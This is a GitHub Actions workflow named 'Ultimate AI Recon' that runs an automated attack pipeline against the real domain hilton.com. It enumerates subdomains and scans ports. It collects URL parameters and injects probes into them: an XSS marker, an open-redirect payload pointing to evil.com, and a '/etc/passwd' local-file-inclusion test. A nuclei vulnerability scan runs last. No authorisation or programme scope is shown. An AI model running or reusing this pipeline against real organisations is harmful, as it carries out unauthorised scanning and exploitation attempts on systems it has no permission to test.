name: Ultimate AI Recon

on:
  workflow_dispatch:

jobs:
  recon:
    runs-on: ubuntu-latest

    env:
      TARGET: hilton.com

    steps:

      - name: Install Tools
        run: |
          sudo apt-get update -y
          sudo apt-get install -y golang-go git python3-pip curl

          export PATH=$PATH:/home/runner/go/bin

          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
          go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
          go install github.com/projectdiscovery/katana/cmd/katana@latest
          go install github.com/lc/gau/v2/cmd/gau@latest
          go install github.com/tomnomnom/waybackurls@latest

          pip3 install uro qsreplace

      - name: Subdomain Recon
        run: |
          ~/go/bin/subfinder -d $TARGET -all -silent > subs.txt
          cat subs.txt | ~/go/bin/httpx -silent > live.txt

      - name: Port Scan
        run: |
          ~/go/bin/naabu -l live.txt -silent -o ports.txt

      - name: URL Gathering
        run: |
          cat live.txt | gau > gau.txt
          cat live.txt | waybackurls > wayback.txt
          cat gau.txt wayback.txt | uro > urls.txt

      - name: JS Crawling
        run: |
          ~/go/bin/katana -list live.txt -silent -o crawl.txt

      - name: Param Discovery
        run: |
          cat urls.txt crawl.txt | grep "=" | sort -u > params.txt

      - name: XSS Reflection Check
        run: |
          cat params.txt | qsreplace 'xsstest123' | \
          ~/go/bin/httpx -silent -mr 'xsstest123' -o xss_reflection.txt || true

      - name: Open Redirect Check
        run: |
          cat params.txt | qsreplace 'https://evil.com' | \
          ~/go/bin/httpx -location -silent -o redirect.txt || true

      - name: LFI Discovery
        run: |
          cat params.txt | qsreplace '/etc/passwd' | \
          ~/go/bin/httpx -mr 'root:x' -silent -o lfi.txt || true

      - name: Nuclei Scan
        run: |
          ~/go/bin/nuclei -l live.txt -severity low,medium,high,critical -o nuclei.txt

      - name: Upload Results
        uses: actions/upload-artifact@v4
        with:
          name: recon-results
          path: |
            subs.txt
            live.txt
            urls.txt
            crawl.txt
            params.txt
            ports.txt
            nuclei.txt
            xss_reflection.txt
            redirect.txt
            lfi.txt
